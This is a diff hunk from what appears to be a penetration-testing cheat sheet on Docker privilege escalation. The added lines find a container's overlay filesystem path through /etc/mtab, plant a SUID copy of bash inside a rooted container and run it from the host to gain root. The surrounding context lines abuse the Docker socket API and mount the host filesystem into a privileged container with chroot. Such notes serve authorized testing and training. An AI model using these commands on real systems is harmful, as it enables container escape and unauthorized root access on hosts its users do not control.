@@ -1470,7 +1470,14 @@ curl -X POST -H "Content-Type: application/json" --unix-socket /var/run/docker.s
 curl -X POST -H "Content-Type:application/json" --unix-socket /var/run/docker.sock http:/./containers/f33aa36ef776879b434e918208f9db2e1bce018484a019482ff6a85cb5f98a9a/start
 ls -la /var/tmp
 
+-->> Access Docker File System
 cat /etc/mtab | grep -oP 'upperdir.*' | cut -d ',' -f1
+ls -la /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff
+
+-->> Make Bash SUID From Rooted Docker: Execute From Host
+cp /bin/bash /var/www; chmod +s /var/www/bash
+/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/var/www/bash -p
+
 docker ps -a
 docker commit 35c090009763 tempimg
 docker run -v /:/mnt --rm --privileged -it tempimg chroot /mnt sh
